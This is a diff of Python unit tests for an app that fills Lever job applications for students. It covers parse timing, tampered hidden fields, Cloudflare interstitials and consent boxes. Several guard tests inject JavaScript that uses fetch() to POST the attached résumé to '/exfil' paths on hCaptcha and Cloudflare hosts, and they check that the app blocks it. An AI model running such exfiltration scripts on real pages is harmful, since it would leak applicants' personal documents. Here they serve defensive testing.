@@ -19,6 +19,7 @@ import tempfile
 import unittest
 from pathlib import Path
 from types import SimpleNamespace
+from urllib.parse import urlparse
 from unittest import mock
 
 sys.path.insert(0, str(Path(__file__).resolve().parent))
@@ -76,9 +77,9 @@ def resume_payload(data=RESUME_BYTES, name=RESUME_NAME):
     return FilePayload(name=name, mime_type="application/pdf", buffer=data, sha256=hashlib.sha256(data).hexdigest())
 
 
-def lever_sources(*, upload=True, location=LOCATION, facts=None, **more):
+def lever_sources(*, upload=True, location=LOCATION, facts=None, resume_name=RESUME_NAME, **more):
     """What a value may come from for a Lever run. ``upload`` is the student's L1 choice (apply_lever_resume_upload)."""
-    resume = dict(helpers_apply.RESUME_OK, sha256=RESUME_SHA, original_name=RESUME_NAME)
+    resume = dict(helpers_apply.RESUME_OK, sha256=RESUME_SHA, original_name=resume_name)
     src = helpers_apply.sources(facts=FACTS if facts is None else facts, labels={"location": location} if location else {}, resume=resume, **more)
     return dataclasses.replace(src, resume_upload=upload)
 
@@ -308,6 +309,68 @@ class ParseTimeoutTests(LeverCase):
         self.assertEqual([seen.status for seen in fake.parse_posts()], [0], "the page was gone when the reply came")
 
 
+# --- A read that has begun is waited for, whatever the app finds when it looks at the input afterwards ----------------------------------------
+
+class ReadStartedTests(LeverCase):
+    """The file is with Lever the moment it is attached (the page's change handler posts it). The app waits for the read to end before it touches
+    anything, even when its own look at the input afterwards finds fault, and the reader's late reply never lands in the student's turn."""
+
+    def ticks(self):
+        forms = []
+
+        def student(page, step, seen):
+            if step == "handoff":
+                forms.append(page.evaluate(FORM_VALUES_JS))
+
+        return forms, student
+
+    def assert_the_form_is_the_students(self, forms):
+        self.assertTrue(forms, "the student's turn was never seen")
+        reply = lever_parse_reply()
+        for form in forms:
+            self.assertEqual(form["org"], "", "the reader's guess is in the form during the student's turn")
+            self.assertEqual(json.loads(form["selectedLocation"])["name"], LOCATION, "the hidden location is not the one the app chose")
+            self.assertEqual(form["location"], LOCATION)
+            self.assertNotIn(reply["org"], json.dumps(form))
+
+    def test_a_file_name_the_page_shows_with_its_spaces_squeezed_is_still_the_file_and_nothing_is_touched_while_the_page_reads(self):
+        fake = FakeLever()
+        fake.parse_delay_s = 1.5     # "working" outlasts the whole fill, so an early fill leaves the reply to land in the student's turn
+        forms, student = self.ticks()
+        name = "Sam  Rivera Resume.pdf"
+        run = self.go(fake, src=lever_sources(resume_name=name), files={"resume": resume_payload(name=name)}, student=student, timeouts=dataclasses.replace(TIMEOUTS, handoff_s=3.0))
+        self.assertTrue(all(shown == "success" for _kind, _key, shown, _frames, _before in run.agent.acts[1:]), run.agent.acts)
+        self.assertEqual(run.result.evidence["resume_parse"], "success")
+        self.assertEqual(run.result.evidence["guesses_cleared"], ["org"])
+        self.assertEqual(self.entries(run)["resume"]["disposition"], "fill")
+        self.assert_the_form_is_the_students(forms)
+
+    def test_a_hidden_location_that_stops_agreeing_with_the_visible_one_before_the_turn_stops_the_run(self):
+        fake = FakeLever()
+        # Something on the page rewrites the hidden field after the app has chosen the place, when the app clears the reader's guess in another field.
+        fake.inject.append(script("""document.querySelector('[name="org"]').addEventListener('change', function () {
+            document.querySelector('[name="selectedLocation"]').value = JSON.stringify({name: 'Guessville, Example State, United States', id: 'x'}); });"""))
+        run = self.go(fake)
+        self.assertEqual((run.result.outcome, run.result.after_click, run.result.handed_over), ("needs_you", False, False))
+        self.assertEqual(run.result.reasons, ['The field "Current location" did not take the answer'])
+
+    def test_a_check_of_the_input_that_fails_after_the_file_went_still_waits_for_the_read(self):
+        fake = FakeLever()
+        fake.parse_delay_s = 1.5
+        # The page never shows the file's name inside the question, so the app cannot confirm what the input holds.
+        fake.inject.append(script("""var label = document.querySelector('.visible-resume-upload .filename');
+            new MutationObserver(function () { if (label.textContent) label.textContent = ''; }).observe(label, {childList: true, characterData: true, subtree: true});"""))
+        forms, student = self.ticks()
+        run = self.go(fake, student=student, timeouts=dataclasses.replace(TIMEOUTS, handoff_s=3.0))
+        self.assertEqual(len(fake.parse_posts()), 1)
+        self.assertEqual(run.agent.acts[1][:3], ("attach", "resume", "success"), "the input was only taken out again once the page had finished with the file")
+        self.assertNotIn("working", [shown for _kind, _key, shown, _frames, _before in run.agent.acts], run.agent.acts)
+        self.assertEqual((run.result.evidence["resume_parse"], run.result.evidence["resume_sent_to_lever"]), ("success", True))
+        self.assertEqual(self.entries(run)["resume"]["disposition"], "left_for_you")
+        self.assertEqual(self.left(run)["resume_sent"], "Your résumé was sent to Lever when the app attached it.")
+        self.assert_the_form_is_the_students(forms)
+
+
 # --- Item 2: the reader's guesses --------------------------------------------------------------------------------------------
 
 class ClearingTests(LeverCase):
@@ -472,6 +535,63 @@ class GuardTests(LeverCase):
         self.assertEqual(len(fake.parse_posts()), 1)
         self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])
 
+    def test_the_attached_file_posted_to_a_place_the_fill_lets_writes_through_is_aborted_recorded_and_ends_the_run(self):
+        # Cloudflare's path and the hCaptcha hosts take writes while the form is filled. The résumé is in the input by then, and a script can post it to either.
+        for host, path in (("jobs.lever.co", "/cdn-cgi/challenge-platform/h/g/exfil"), ("hcaptcha.com", "/exfil"), ("api2.hcaptcha.com", "/exfil"), ("js.hcaptcha.com", "/exfil")):
+            with self.subTest(host=host):
+                fake = FakeLever()
+                fake.inject.append(script(self.ON_CHANGE % (
+                    "setTimeout(function () { var data = new FormData(); data.append('file', input.files[0], 'x.pdf'); "
+                    f"fetch('https://{host}{path}', {{method: 'POST', body: data}}); }}, 50);")))
+                run = self.go(fake)
+                self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host=host)), 1, run.result.refused)
+                self.assertEqual([seen for seen in fake.requests if seen.method == "POST" and seen.path == path], [], "the file reached the address")
+                self.assertEqual([seen.part("resume").sha256 for seen in fake.parse_posts()], [RESUME_SHA])
+                self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])
+                self.assertEqual(run.result.evidence["upload_refused"]["rule"], "upload_elsewhere")
+
+    WRITE_ADDRESSES = (
+        ("jobs.lever.co", "/cdn-cgi/challenge-platform/h/g/exfil"), ("hcaptcha.com", "/exfil"), ("api.hcaptcha.com", "/exfil"), ("api2.hcaptcha.com", "/exfil"),
+        ("js.hcaptcha.com", "/exfil"),
+    )
+
+    def test_the_attached_file_as_the_raw_body_of_a_write_is_aborted_recorded_and_ends_the_run(self):
+        # ``fetch(address, {method: 'POST', body: input.files[0]})`` is not a multipart body and not an octet stream: it is the file's own bytes under the file's own type.
+        for host, path in self.WRITE_ADDRESSES:
+            with self.subTest(host=host):
+                fake = FakeLever()
+                fake.inject.append(script(self.ON_CHANGE % (
+                    f"setTimeout(function () {{ fetch('https://{host}{path}', {{method: 'POST', body: input.files[0]}}); }}, 50);")))
+                run = self.go(fake)
+                self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host=host)), 1, run.result.refused)
+                self.assertEqual([seen for seen in fake.requests if seen.method == "POST" and seen.path == path], [], "the file reached the address")
+                self.assertEqual([seen.part("resume").sha256 for seen in fake.parse_posts()], [RESUME_SHA])
+                self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])
+                self.assertEqual(run.result.evidence["upload_refused"]["rule"], "upload_elsewhere")
+
+    def test_the_attached_file_posted_in_the_students_turn_before_their_first_press_is_aborted_and_closes_the_window(self):
+        # The file stays in the input for the student's turn, and a script on a timer can send it a moment after the fill. hCaptcha asks nothing of these addresses until the press.
+        posts = {
+            "a form with the file": "var data = new FormData(); data.append('file', input.files[0], 'x.pdf'); return fetch(%r, {method: 'POST', body: data});",
+            "the raw file": "return fetch(%r, {method: 'POST', body: input.files[0]});",
+        }
+        for host, path in self.WRITE_ADDRESSES:
+            for what, code in posts.items():
+                with self.subTest(host=host, what=what):
+                    fake = FakeLever()
+                    sent = []
+
+                    def student(page, step, seen, code=code, host=host, path=path):
+                        if step == "handoff" and not sent:
+                            sent.append(1)
+                            page.evaluate("() => { var input = document.querySelector('#application-form input[name=resume]'); " + code % f"https://{host}{path}" + " }")
+
+                    run = self.go(fake, student=student)
+                    self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host=host)), 1, run.result.refused)
+                    self.assertEqual([seen for seen in fake.requests if seen.method == "POST" and seen.path == path], [], "the file reached the address")
+                    self.assertEqual(run.result.evidence["handoff_end"], "upload", "the window was closed")
+                    self.assertEqual([seen.part("resume").sha256 for seen in fake.parse_posts()], [RESUME_SHA])
+
     def test_a_post_to_any_other_path_is_aborted_and_recorded_before_anything_is_filled(self):
         fake = FakeLever()
         fake.inject.append(script("fetch('/collect', {method: 'POST', body: 'x=1', headers: {'Content-Type': 'application/x-www-form-urlencoded'}});"))
@@ -569,6 +689,65 @@ class ChallengeTests(LeverCase):
         self.assertEqual(fake.apply_posts(), [])
 
 
+class StudentPressTests(LeverCase):
+    """Lever's Submit is a button of type ``button``, and hCaptcha writes after it in bodies a form does not use (a binary one, a script's). Until the app has
+    seen the student's own press, a file-shaped write to an hCaptcha address ends the turn; from the press on only the planned file's bytes do, since a wrong
+    reading would close the window in the middle of the check. So the press must be seen on Lever's page: the listener names Lever's hosts and ``#btn-submit``."""
+    BINARY = bytes([0x81, 0xA1, 0x6B, 0x01])   # a few bytes of a binary (msgpack) body, which is not the planned file
+    CAPTCHA_URL = "https://api.hcaptcha.com/getcaptcha/00000000-0000-0000-0000-000000000000"
+    WRITE = "(args) => fetch(args.url, {method: 'POST', headers: {'Content-Type': args.type}, body: new Uint8Array(args.body)}).catch(() => 0)"
+
+    @staticmethod
+    def written(run, content_type):
+        """The writes of the test's own (the page's hCaptcha posts text and forms) that reached hCaptcha."""
+        return [seen for seen in run.fake.requests if seen.method == "POST" and seen.host == "api.hcaptcha.com" and seen.content_type.startswith(content_type)]
+
+    def play(self, *, press, body, content_type="application/octet-stream"):
+        """A student who presses Submit (``press``: "trusted", "script" or None) and then has hCaptcha write ``body``. Returns the run."""
+        fake = FakeLever()
+        fake.challenge = True
+        done = []
+
+        def student(page, step, seen):
+            if step == "handoff" and not done:
+                done.append(1)
+                if press == "trusted":
+                    page.click("#btn-submit")
+                elif press == "script":
+                    page.evaluate("() => document.getElementById('btn-submit').click()")
+                page.wait_for_timeout(500)
+                page.evaluate(self.WRITE, {"url": self.CAPTCHA_URL, "type": content_type, "body": list(body)})
+                page.wait_for_timeout(300)
+
+        return self.go(fake, student=student, presses=0 if press is None else 1, timeouts=dataclasses.replace(TIMEOUTS, handoff_s=4.0))
+
+    def test_the_students_click_on_submit_is_seen_and_an_hcaptcha_write_after_it_that_is_not_the_file_passes(self):
+        for content_type in ("application/octet-stream", "application/x-msgpack"):
+            with self.subTest(content_type=content_type):
+                run = self.play(press="trusted", body=self.BINARY, content_type=content_type)
+                self.assertGreater(run.agent._state.last_press_at, 0, "the app never saw the student press Submit")
+                self.assertEqual(self.refused(run, rule="upload_elsewhere"), [], run.result.refused)
+                self.assertEqual([seen.path for seen in self.written(run, content_type)], [urlparse(self.CAPTCHA_URL).path], "the write did not reach hCaptcha")
+                self.assertEqual(run.result.evidence["handoff_end"], "timeout", "the student's turn was closed by something other than the clock")
+
+    def test_the_planned_file_is_still_refused_after_the_press_and_closes_the_window(self):
+        run = self.play(press="trusted", body=RESUME_BYTES)
+        self.assertGreater(run.agent._state.last_press_at, 0)
+        self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host="api.hcaptcha.com")), 1, run.result.refused)
+        self.assertEqual(run.result.evidence["handoff_end"], "upload")
+        self.assertEqual(self.written(run, "application/octet-stream"), [], "the file reached hCaptcha")
+
+    def test_a_click_the_page_makes_itself_is_not_the_press_and_the_strict_reading_stays(self):
+        run = self.play(press="script", body=self.BINARY)
+        self.assertEqual(run.agent._state.last_press_at, 0.0, "a script's click was counted as the student's press")
+        self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host="api.hcaptcha.com")), 1, run.result.refused)
+        self.assertEqual(run.result.evidence["handoff_end"], "upload")
+
+    def test_with_no_press_a_binary_write_to_hcaptcha_is_refused_in_the_students_turn(self):
+        run = self.play(press=None, body=self.BINARY)
+        self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host="api.hcaptcha.com")), 1, run.result.refused)
+
+
 # --- Item 9: the banner and the interstitial --------------------------------------------------------------------------------------------
 
 class BannerAndInterstitialTests(LeverCase):
@@ -586,6 +765,23 @@ class BannerAndInterstitialTests(LeverCase):
         self.assertEqual(run.seen["form"]["name"], "Sam Rivera")
         self.assertEqual(run.result.evidence["page"], "application_form")
         self.assertEqual(run.result.evidence["handoff_end"], "timeout")
+
+    def test_a_cloudflare_interstitial_served_with_an_error_status_is_waited_out_too_and_any_other_error_page_is_not(self):
+        fake = FakeLever()
+        fake.interstitial_s = 10.0
+        fake.interstitial_status = 403
+        run = self.go(fake, timeouts=dataclasses.replace(TIMEOUTS, person_s=20.0))
+        self.assertGreaterEqual(fake.interstitials_served, 1)
+        self.assertIn("challenge", run.steps)
+        self.assertEqual((run.seen["form"]["name"], run.result.evidence["page"]), ("Sam Rivera", "application_form"))
+
+        class Forbidden(FakeLever):
+            def _apply_page(self, fixture, **more):
+                return apply_fake_ats.Reply(403, "<html><head><title>Forbidden</title></head><body>No.</body></html>")
+
+        other = self.go(Forbidden())
+        self.assertEqual((other.result.outcome, other.result.reasons), ("failed", ["Lever answered HTTP 403"]))
+        self.assertEqual(other.agent.acts, [])
 
     def test_an_interstitial_that_never_ends_settles_needs_you_with_nothing_sent(self):
         fake = FakeLever()
@@ -672,6 +868,10 @@ class EeoAndConsentTests(LeverCase):
         for key in ("disability_status", "eeo[disabilitySignature]", "eeo[disabilitySignatureDate]"):
             self.assertNotIn(key, run.agent.keys(), key)
         self.assertEqual(set(run.agent.keys("choose")) | set(run.agent.keys("tick")), {"gender", "race", "veteran_status"})
+        # The independent check reads the answers back against the plan under the plan's names: the app's own decline is not a value the page put there.
+        self.assertEqual([item for item in run.result.check_problems if item["kind"] == "unplanned_value"], [])
+        self.assertEqual([key for key in self.left(run) if key.startswith("eeo[")], [])
+        self.assertEqual({self.entries(run)[key]["disposition"] for key in ("gender", "race", "veteran_status")}, {"fill"})
 
     def test_without_a_stored_decline_the_eeo_block_is_left_alone(self):
         run = self.go(page="demo_eeo_survey.html")
@@ -694,11 +894,36 @@ class EeoAndConsentTests(LeverCase):
         near = self.go(page="cards_files_consent.html", src=lever_sources(allowed={"acknowledgment"}, store=other))
         self.assertEqual(near.agent.keys("tick"), [], "a statement that is not exactly the box's is no statement for it")
 
-    def test_a_required_group_of_boxes_is_left_whole_and_the_page_wide_relaxation_changes_nothing(self):
+    GROUPS = ("cards[c0c0c0c0-0000-5000-8000-0000000000c0][field1]", "cards[c0c0c0c0-0000-5000-8000-0000000000c0][field2]")
+    STATEMENT_BOX = "cards[c0c0c0c0-0000-5000-8000-0000000000c0][field0]"
+
+    def test_a_required_group_of_boxes_is_left_whole(self):
         run = self.go(page="two_required_groups.html")
         self.assertEqual(run.agent.keys("tick"), [])
         left = self.left(run)
-        self.assertEqual(len([key for key in left if key.startswith("cards[")]), 2, "both groups are the student's")
+        self.assertEqual(len([key for key in left if key.startswith("cards[")]), 3, "both groups and the statement are the student's")
+
+    def test_the_tick_of_one_box_takes_required_off_every_box_and_the_box_stays_ticked_and_the_other_required_questions_stay_the_students(self):
+        # Spec 10.4 item 13. The app ticks only the statement it has stored word for word. The page's script then drops `required` from every required box on the
+        # page, the ticked one included, so a check that read the page as it is now would no longer find that question required, and would take the tick back.
+        statement = "I certify that the answers above are true and complete."
+        stored = Store(entry("acknowledgment", statement, "checked", kind="checkbox", company_key=apply_policy.employer_key(LEVER_COMPANY)))
+        required = []
+
+        def student(page, step, seen):
+            if step == "handoff" and not required:
+                required.append(page.evaluate("Array.from(document.querySelectorAll('.required-field input[type=checkbox]')).map((box) => box.required)"))
+
+        run = self.go(page="two_required_groups.html", src=lever_sources(allowed={"acknowledgment"}, store=stored), student=student)
+        self.assertEqual(required, [[False] * 5], "the page's script took required off every box")
+        self.assertEqual(run.agent.keys("tick"), [self.STATEMENT_BOX], "ticked once, and not taken back")
+        self.assertEqual(run.seen["form"][self.STATEMENT_BOX], statement)
+        left = self.left(run)
+        for key in self.GROUPS:
+            self.assertIn(key, left, "a group nobody answered is still the student's")
+            self.assertNotIn(key, run.seen["form"], "and the app ticked nothing in it")
+        self.assertNotIn(self.STATEMENT_BOX, left)
+        self.assertEqual([item for item in run.result.check_problems if item["kind"] in ("required_not_seen", "unplanned_value", "empty")], [])
 
     def test_the_marketing_consent_and_the_pronouns_are_never_ticked(self):
         run = self.go(page="variants.html")
